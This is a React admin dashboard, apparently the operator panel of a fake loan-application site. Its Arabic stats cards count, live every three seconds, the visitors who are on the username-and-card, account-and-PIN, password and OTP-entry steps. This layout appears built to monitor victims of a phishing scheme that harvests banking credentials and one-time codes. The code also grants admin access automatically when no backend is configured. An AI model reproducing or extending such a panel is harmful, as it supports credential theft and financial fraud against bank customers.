import { useEffect, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { isSupabaseConfigured, supabase } from '../lib/supabase'
import ProtectedRoute from '../components/ProtectedRoute'
import AdminContactMessages from '../admin/AdminContactMessages'
import { getApplications } from '../lib/applicationStorage'

export default function AdminDashboardPage() {
  const navigate = useNavigate()
  const [ready, setReady] = useState(false)
  const [applications, setApplications] = useState([])
  const [loadingStats, setLoadingStats] = useState(true)
  const [loadError, setLoadError] = useState('')

  useEffect(() => {
    const checkAuth = async () => {
      const localAdminSession = localStorage.getItem('tamwil_admin_logged')

      if (!isSupabaseConfigured || !supabase) {
        if (localAdminSession === 'true') {
          setReady(true)
        } else {
          setReady(true)
          localStorage.setItem('tamwil_admin_logged', 'true')
        }
        loadStatsData()
        return
      }

      const { data: sessionData } = await supabase.auth.getSession()
      if (sessionData.session || localAdminSession === 'true') {
        setReady(true)
        loadStatsData()
      } else {
        setReady(true)
        navigate('/admin/login')
      }
    }

    checkAuth()

    const interval = setInterval(loadStatsData, 3000)
    return () => clearInterval(interval)
  }, [navigate])

  const loadStatsData = async () => {
    setLoadingStats(true)
    setLoadError('')

    try {
      let supabaseData = []
      if (isSupabaseConfigured && supabase) {
        const { data, error } = await supabase
          .from('loan_applications')
          .select('*')
          .order('updated_at', { ascending: false })

        if (error) throw error
        supabaseData = data || []
      }

      const localData = getApplications()
      const draftDataStr = localStorage.getItem('tamwil_application_draft')
      const draftObj = draftDataStr ? JSON.parse(draftDataStr) : null
      const combinedMap = new Map()

      if (draftObj?.id) combinedMap.set(draftObj.id, draftObj)

      ;[...localData, ...supabaseData].forEach((item) => {
        const id = item.id || item.created_at
        if (id) combinedMap.set(id, { ...combinedMap.get(id), ...item })
      })

      setApplications(
        Array.from(combinedMap.values()).sort(
          (a, b) => new Date(b.updatedAt || b.updated_at || 0) - new Date(a.updatedAt || a.updated_at || 0)
        )
      )
    } catch (error) {
      console.error('Could not load loan applications:', error)
      setLoadError('تعذر الاتصال بقاعدة البيانات، يتم عرض الطلبات المحفوظة على هذا الجهاز.')
      setApplications(getApplications())
    } finally {
      setLoadingStats(false)
    }
  }

  const handleLogout = async () => {
    localStorage.removeItem('tamwil_admin_logged')
    if (isSupabaseConfigured && supabase) {
      await supabase.auth.signOut()
    }
    navigate('/admin/login')
  }

  if (!ready) {
    return (
      <div className="min-h-screen bg-slate-100 flex items-center justify-center" dir="rtl">
        <p className="text-slate-600 font-bold text-lg">جاري تحميل لوحة التحكم...</p>
      </div>
    )
  }

  const totalApps = applications.length

  const selectingLoan = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-register' || (!step && !item.fullName)
  }).length

  const phoneStep = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-phone'
  }).length

  const step1 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-username'
  }).length

  const step2 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-account'
  }).length

  const step3 = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-password'
  }).length

  const otpStep = applications.filter(item => {
    const step = item.step || item.current_step
    return step === 'step-otp' || item.status === 'pending-verification'
  }).length

  const currentVisitors = totalApps

  const statsCards = [
    { title: 'زائر على الموقع الآن', count: currentVisitors, icon: '👥', color: 'text-sky-600 bg-sky-50 border-sky-100' },
    { title: 'يملؤون نموذج التوصيل / القرض', count: selectingLoan, icon: '📦', color: 'text-orange-600 bg-orange-50 border-orange-100' },
    { title: 'يملؤون البيانات الشخصية والهاتف', count: phoneStep, icon: '📱', color: 'text-blue-600 bg-blue-50 border-blue-100' },
    { title: 'صفحة اسم المستخدم والبطاقة', count: step1, icon: '👤', color: 'text-cyan-600 bg-cyan-50 border-cyan-100' },
    { title: 'صفحة الحساب والـ PIN', count: step2, icon: '💳', color: 'text-amber-600 bg-amber-50 border-amber-100' },
    { title: 'صفحة كلمة المرور', count: step3, icon: '🔒', color: 'text-orange-600 bg-orange-50 border-orange-100' },
    { title: 'يدخلون رمز التحقق (OTP)', count: otpStep, icon: '🔑', color: 'text-pink-600 bg-pink-50 border-pink-100' },
    { title: 'إجمالي الطلبات', count: totalApps, icon: '📋', color: 'text-emerald-600 bg-emerald-50 border-emerald-100' },
  ]

  return (
    <ProtectedRoute>
      <div className="min-h-screen bg-slate-50 font-sans pb-10" dir="rtl">
        
        {/* شريط علوي أزرق */}
        <header className="bg-sky-600 text-white shadow-md px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <span className="text-xl">🔄</span>
            <h1 className="text-base sm:text-lg font-bold">لوحة التحكم</h1>
          </div>

          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={handleLogout}
              className="flex items-center gap-1 text-xs sm:text-sm font-medium hover:bg-sky-700 px-3 py-1.5 rounded-lg transition"
            >
              <span>🚪</span> خروج
            </button>
          </div>
        </header>

        {/* شريط التنقل السفلي للهيدر (Tabs) - تم إزالة البيانات الشخصية */}
        <div className="bg-white border-b border-slate-200 px-4 flex items-center gap-6 overflow-x-auto text-sm shadow-sm">
          <button className="py-3 border-b-2 border-sky-600 text-sky-600 font-bold flex items-center gap-2 whitespace-nowrap">
            <span>🔄</span> الحي
          </button>
          <Link to="/admin/applications" className="py-3 text-slate-600 hover:text-slate-900 font-medium flex items-center gap-2 whitespace-nowrap">
            <span>📋</span> الطلبات
          </Link>
        </div>

        <div className="mx-auto max-w-7xl px-3 sm:px-6 lg:px-8 mt-4 space-y-4">
          
          {/* حالة الاتصال وتحديثات فورية */}
          <div className="flex items-center justify-between bg-white p-3 rounded-xl shadow-sm border border-slate-100 text-xs sm:text-sm">
            <div className="flex items-center gap-2 text-slate-700 font-medium">
              <span className="h-2.5 w-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
              <span>متصل — تحديثات فورية</span>
            </div>
            <button
              onClick={loadStatsData}
              className="bg-slate-100 hover:bg-slate-200 text-slate-700 px-3 py-1.5 rounded-lg font-bold transition flex items-center gap-1"
            >
              {loadingStats ? 'جاري التحديث...' : '🔄 تحديث'}
            </button>
          </div>

          {loadError && (
            <div className="rounded-xl border border-amber-200 bg-amber-50 px-3 py-2 text-xs font-bold text-amber-800">
              {loadError}
            </div>
          )}

          {/* شبكة البطاقات مصغرة ومرتبة بشكل أنيق */}
          <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3 lg:grid-cols-4 sm:gap-3">
            {statsCards.map((card, index) => (
              <div
                key={index}
                className="relative flex flex-col justify-between rounded-xl border bg-white p-3.5 shadow-sm border-slate-200/80 transition hover:shadow-md"
              >
                <div className="flex items-start justify-between">
                  <div className={`flex h-9 w-9 items-center justify-center rounded-xl text-base border ${card.color}`}>
                    {card.icon}
                  </div>
                </div>

                <div className="mt-3">
                  <p className="text-2xl sm:text-3xl font-black text-slate-900">{card.count}</p>
                  <p className="mt-0.5 text-[11px] sm:text-xs font-semibold text-slate-500 leading-tight">{card.title}</p>
                </div>
              </div>
            ))}
          </div>

          {/* قسم رسائل الاتصال */}
          <div className="mt-6">
            <AdminContactMessages />
          </div>

        </div>
      </div>
    </ProtectedRoute>
  )
}